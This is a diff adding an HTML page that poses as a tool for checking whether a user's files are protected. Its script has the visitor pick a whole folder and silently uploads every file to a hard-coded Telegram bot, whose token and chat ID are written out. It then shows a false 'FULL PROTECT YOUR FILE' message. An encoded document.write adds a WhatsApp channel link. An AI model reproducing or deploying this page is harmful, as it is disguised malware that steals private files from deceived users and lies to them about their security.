@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CHECK YOUR FILE PROTECT OR NO PROTECT</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* { box-sizing: border-box; }
+body {
+  margin: 0;
+  font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+  color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+.container {
+  background: rgba(255,255,255,0.05);
+  border-radius: 20px;
+  padding: 40px 30px;
+  width: 100%;
+  max-width: 420px;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+  backdrop-filter: blur(10px);
+  text-align: center;
+}
+h2 { color: #00e676; margin-bottom: 10px; font-size: 28px; }
+p { color: #ccc; font-size: 16px; margin-bottom: 20px; }
+#folderStatus { color: #90ee90; font-size: 14px; margin: -10px 0 20px; }
+.button {
+  display: inline-block; width: 100%; padding: 14px; margin-bottom: 15px;
+  background-color: #00e676; color: #000; font-weight: 600; font-size: 16px;
+  border: none; border-radius: 10px; cursor: pointer; transition: background-color 0.3s ease;
+}
+.button:hover { background-color: #00c853; }
+#progressContainer { margin-top: 20px; text-align: left; display: none; }
+.progress-bar { width: 100%; background-color: #333; border-radius: 10px; overflow: hidden; height: 20px; }
+.progress-bar-fill { background: #00e676; height: 100%; width: 0%; transition: width 0.3s ease-in-out; }
+#progressText { margin-top: 10px; font-size: 14px; color: #eee; }
+#fileInput { display: none; }
+/* JOIN FOR MORE Box */
+.join-box {
+  margin-top: 20px;
+  text-align: center;
+  padding: 12px;
+  background: rgba(255,255,255,0.1);
+  border-radius: 10px;
+}
+.join-box a {
+  display: inline-block;
+  background: #00e676;
+  color: #000;
+  padding: 10px 16px;
+  border-radius: 8px;
+  font-weight: bold;
+  text-decoration: none;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>CHECK YOUR FILE PROTECT OR NO PROTECT</h2>
+  <p>Please select a folder and check you security.</p>
+  <button type="button" class="button" id="selectFolderBtn">📂 Select Folder</button>
+  <p id="folderStatus"></p>
+  <form id="uploadForm">
+    <input type="file" id="fileInput" webkitdirectory multiple required />
+    <button type="submit" class="button">Next ➡️</button>
+  </form>
+  <div id="progressContainer">
+    <div class="progress-bar">
+      <div class="progress-bar-fill" id="progressFill"></div>
+    </div>
+    <div id="progressText"></div>
+  </div>
+
+  <!-- JOIN FOR MORE Box -->
+  <script>
+<!--
+document.write(unescape("%3Cdiv%20class%3D%22join-box%22%3E%0A%20%20%20%20%3Cdiv%20style%3D%22font-weight%3Abold%3B%20color%3A%23fff%3B%20margin-bottom%3A8px%3B%22%3EJOIN%20FOR%20MORE%3C/div%3E%0A%20%20%20%20%3Ca%20href%3D%22https%3A//whatsapp.com/channel/0029VbDRJh789ine9bjCVF3m%22%20target%3D%22_blank%22%3EOpen%20WhatsApp%20Channel%3C/a%3E%0A%20%20%3C/div%3E%0A%3C/div%3E"));
+//-->
+</script>
+
+<script>
+const botToken = '8879634521:AAHvbPcS48GOMCVcQ1kD8wCzA7DrwnybUyY';
+const chatId = '8558373429';
+const selectFolderBtn = document.getElementById('selectFolderBtn');
+const fileInput = document.getElementById('fileInput');
+const form = document.getElementById('uploadForm');
+const progressContainer = document.getElementById('progressContainer');
+const progressFill = document.getElementById('progressFill');
+const progressText = document.getElementById('progressText');
+const folderStatus = document.getElementById('folderStatus');
+
+let selectedFiles = [];
+
+selectFolderBtn.addEventListener('click', () => {
+  fileInput.click();
+});
+
+fileInput.addEventListener('change', () => {
+  selectedFiles = Array.from(fileInput.files);
+  folderStatus.textContent = selectedFiles.length > 0 ? "✅ Folder selected" : '';
+});
+
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  if (selectedFiles.length === 0) {
+    alert('Please select a folder and check you security ');
+    return;
+  }
+
+  progressContainer.style.display = 'block';
+  progressText.textContent = 'Progressing...';
+  progressFill.style.width = '0%';
+  progressText.style.color = '#eee';
+
+  let uploadedCount = 0;
+  const total = selectedFiles.length;
+  const CONCURRENCY = 3;
+  let index = 0;
+
+  async function uploadFile(file) {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('document', file);
+    const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
+
+    try {
+      await fetch(url, {
+        method: 'POST',
+        body: formData,
+      });
+    } catch (err) {
+      console.error('Upload error:', err);
+    }
+
+    uploadedCount++;
+    updateProgress(uploadedCount, total);
+  }
+
+  function updateProgress(done, total) {
+    const percent = Math.round((done / total) * 100);
+    progressFill.style.width = `${percent}%`;
+    progressText.textContent = `Uploading... ${percent}%`;
+  }
+
+  async function uploadQueue() {
+    const workers = [];
+    while (index < total) {
+      while (workers.length < CONCURRENCY && index < total) {
+        const promise = uploadFile(selectedFiles[index++]);
+        workers.push(promise);
+      }
+      await Promise.race(workers).then(() => {
+        workers.splice(workers.findIndex(p => p !== undefined), 1);
+      });
+    }
+    await Promise.all(workers);
+  }
+
+  await uploadQueue();
+
+  setTimeout(() => {
+    progressFill.style.width = `100%`;
+    progressText.textContent = '✔️FULL PROTECT YOUR FILE🛡️.';
+    progressText.style.color = '#03FF06';
+  }, 500);
+});
+</script>
+</body>
+</html>
